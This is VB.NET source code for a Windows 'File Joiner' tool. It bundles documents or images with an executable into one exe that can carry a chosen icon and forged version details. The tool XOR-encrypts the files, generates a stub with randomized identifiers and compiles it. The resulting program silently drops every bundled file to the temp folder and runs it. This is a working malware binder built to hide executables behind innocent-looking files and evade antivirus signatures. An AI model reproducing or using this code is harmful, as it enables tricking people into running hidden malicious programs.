Public Class Form1
    ReadOnly NewLine As String = Environment.NewLine
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim ofd As New OpenFileDialog
        ofd.Filter = "All Files (*.*)|*.*"
        ofd.Multiselect = True
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            For i = 0 To ofd.FileNames.Length - 1
                AddFile(ofd.FileNames(i))
            Next
        End If
        ofd.Dispose()
    End Sub
    Sub AddFile(ByVal filename As String)
        For j = 0 To ListView1.Items.Count - 1
            If ListView1.Items.Item(j).Tag = filename Then
                Exit Sub
            End If
        Next
        ImageList1.Images.Add(IO.Path.GetFileName(filename), Icon.ExtractAssociatedIcon(filename))
        With ListView1.Items.Add(IO.Path.GetFileName(filename))
            .SubItems.Add(IO.Path.GetExtension(filename))
            Dim size As Long = My.Computer.FileSystem.GetFileInfo(filename).Length
            Dim sized As String
            If size > 1024 Then
                size = size / 1024
                sized = size.ToString & " KB"
                If size > 1024 Then
                    size = size / 1024
                    sized = size.ToString & " MB"
                    If size > 1024 Then
                        size = size / 1024
                        sized = size.ToString & " GB"
                    End If
                End If
            Else
                sized = size.ToString + " Bytes"
            End If
            .SubItems.Add(sized)
            .SubItems.Add(IO.Path.GetDirectoryName(filename))
            .ImageIndex = ImageList1.Images.Count - 1
            .Tag = filename
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        For Each item As ListViewItem In ListView1.SelectedItems
            ListView1.Items.Remove(item)
        Next
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        ListView1.Items.Clear()
        ImageList1.Images.Clear()
    End Sub


    Private Sub ListView1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles ListView1.KeyDown
        If e.KeyCode = Keys.Delete Then
            Button2_Click(Nothing, Nothing)
        End If
    End Sub

    Private Sub ListView1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Button2.Enabled = ListView1.SelectedItems.Count > 0
    End Sub

    Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
        If CheckBox1.Checked Then
            CheckBox1_CheckedChanged(Nothing, Nothing)
        Else
            CheckBox1.Checked = True
        End If
    End Sub

    Private Sub ListBox1_DragDrop(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles ListView1.DragDrop
        Dim files = CType(e.Data.GetData(DataFormats.FileDrop), Array)
        For Each value In files
            If IO.File.Exists(value) Then AddFile(value)
        Next
    End Sub

    Private Sub ListBox1_DragEnter(ByVal sender As Object, ByVal e As System.Windows.Forms.DragEventArgs) Handles ListView1.DragEnter
        If (e.Data.GetDataPresent(DataFormats.FileDrop)) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        If ListView1.Items.Count < 1 Then
            MsgBox("Add more files!!", MsgBoxStyle.Critical, "Missing files")
            Exit Sub
        Else
            Dim item As ListViewItem
            For Each item In ListView1.Items
                If Not IO.File.Exists(item.Tag) Then
                    MsgBox("Cannot find " & item.Tag, MsgBoxStyle.Critical, "Missing files")
                    Exit Sub
                End If
            Next
        End If
        If PictureBox1.Tag IsNot Nothing AndAlso Not IO.File.Exists(PictureBox1.Tag) Then
            MsgBox("Cannot find the loaded Icon", MsgBoxStyle.Critical, "Missing Icon")
            Exit Sub
        End If
        Dim FilePath As String
        Dim sfd As New SaveFileDialog
        sfd.Filter = "*.exe|*.exe"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            FilePath = sfd.FileName
        Else
            Exit Sub
        End If

        
        Dim FileInf As New AssemblyFileInfo(False)
        If CheckBox4.Checked Then
            FileInf = New AssemblyFileInfo(TextBox2.Text, TextBox3.Text, TextBox5.Text, TextBox4.Text, TextBox7.Text, TextBox6.Text, TextBox9.Text, TextBox8.Text)
        End If

        Dim FileList As String = RandomName(15)
        Dim Key As String = RandomName(15)
        Dim KeyValue() As Byte = System.Text.Encoding.Default.GetBytes(RandomName(30))
        Dim Buffer As String = RandomName(15)
        Dim Bytes As String = RandomName(15)
        Dim i As String = RandomName(15)
        Dim Decrypt As String = RandomName(15)

        Dim Sourcode As String = "Public Class " & RandomName(15) & NewLine & _
            "Shared Sub Main()" & NewLine & _
            "On Error Resume Next" & NewLine & _
            "Dim " & FileList & "() As String = New String() {"
        For j = 0 To ListView1.Items.Count - 2
            Sourcode &= """" & ListView1.Items(j).Text & """" & ","
        Next
        Sourcode &= """" & ListView1.Items(ListView1.Items.Count - 1).Text & """" & "}" & NewLine
        Sourcode &= "Dim " & Key & "() As Byte = New Byte() {"
        For j = 0 To KeyValue.Length - 2
            Sourcode &= KeyValue(j).ToString & ","
        Next
        Sourcode &= KeyValue(KeyValue.Length - 1).ToString & "}" & NewLine & _
                    "For " & i & " As Integer = 0 To " & FileList & ".Length - 1" & NewLine & _
                    "Dim " & Buffer & " As IO.Stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(" & FileList & "(" & i & "))" & NewLine & _
                    "If Not " & Buffer & " Is Nothing Then" & NewLine & _
                    "Dim " & Bytes & "(" & Buffer & ".Length -1) As Byte" & NewLine & _
                    Buffer & ".Read(" & Bytes & ",0," & Bytes & ".Length)" & NewLine & _
                    "IO.File.WriteAllBytes(IO.Path.GetTempPath & " & FileList & "(" & i & "), " & Decrypt & "(" & Bytes & ", " & Key & "))" & NewLine & _
                    "Diagnostics.Process.Start(IO.Path.GetTempPath & " & FileList & "(" & i & "))" & NewLine & _
                    "End If" & NewLine & _
                    "Next" & NewLine & _
                    "End Sub" & NewLine & _
                    "Shared Function " & Decrypt & "(ByVal " & Buffer & "() As Byte, ByVal " & Key & "() As Byte) As Byte()" & NewLine & _
                    "For " & i & " As Integer = 0 To " & Buffer & ".Length - 1" & NewLine & _
                     Buffer & "(" & i & ") = " & Buffer & "(" & i & ") Xor " & Key & "(" & i & " Mod " & Key & ".Length)" & NewLine & _
                    "Next" & NewLine & _
                    "Return " & Buffer & NewLine & _
                    "End Function" & NewLine & _
                    "End Class"

        Dim Resources(ListView1.Items.Count - 1) As String
        If Not IO.Directory.Exists(Application.StartupPath & "\Temp") Then
            IO.Directory.CreateDirectory(Application.StartupPath & "\Temp")
        End If
        For j = 0 To ListView1.Items.Count - 1
            Dim buff() As Byte = My.Computer.FileSystem.ReadAllBytes(ListView1.Items(j).Tag)
            For x = 0 To buff.Length - 1
                buff(x) = buff(x) Xor KeyValue(x Mod KeyValue.Length)
            Next
            My.Computer.FileSystem.WriteAllBytes(Application.StartupPath & "\Temp\" & ListView1.Items(j).Text, buff, False)
            Resources(j) = Application.StartupPath & "\Temp\" & ListView1.Items(j).Text
        Next
        If StubCompiler.CompileAssembly(Sourcode, FilePath, Resources, FileInf, If(CheckBox1.Checked, PictureBox1.Tag, "")) Then
            Dim fs As New IO.FileStream(FilePath, IO.FileMode.Open, IO.FileAccess.Write, IO.FileShare.None)
            fs.Seek(244, 0)
            fs.WriteByte(10)
            fs.Close()
            MsgBox("File Was Successfully Created In " & FilePath, MsgBoxStyle.Information, "Success")

        Else
            MsgBox("An Error Occured While Creating The File, Please Try Again", MsgBoxStyle.Critical, "Error Compile")
        End If
        IO.Directory.Delete(Application.StartupPath & "\Temp", True)
    End Sub
    Function RandomName(Optional ByVal Length As Integer = 8) As String
        Dim r As String = Chr((New Random).Next(65, 90))
        While r.Length < Length
            r &= IO.Path.GetFileNameWithoutExtension(IO.Path.GetRandomFileName)
        End While
        Return r.Substring(0, Length)
    End Function
    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            Dim ofd As New OpenFileDialog
            ofd.Filter = "Icones (*.ico) | *.ico"
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Try
                    PictureBox1.Image = Icon.ExtractAssociatedIcon(ofd.FileName).ToBitmap
                    PictureBox1.Tag = ofd.FileName
                Catch ex As Exception
                    MsgBox(ex.ToString, MsgBoxStyle.Critical, "Error Icon")
                End Try
            Else
                CheckBox1.Checked = False
            End If
        Else
            PictureBox1.Image = Nothing
            PictureBox1.Tag = Nothing
        End If
    End Sub

     
    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        TextBox2.Enabled = CheckBox4.Checked
        TextBox3.Enabled = CheckBox4.Checked
        TextBox4.Enabled = CheckBox4.Checked
        TextBox5.Enabled = CheckBox4.Checked
        TextBox6.Enabled = CheckBox4.Checked
        TextBox7.Enabled = CheckBox4.Checked
        TextBox8.Enabled = CheckBox4.Checked
        TextBox9.Enabled = CheckBox4.Checked

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        CheckBox4_CheckedChanged(Nothing, Nothing)
    End Sub
  
    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        MsgBox("File Joiner by NetProtect: put PDF, Doc, Jpeg, etc. in Window and then combine with any exe", MsgBoxStyle.Information, "About")
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click

    End Sub
End Class
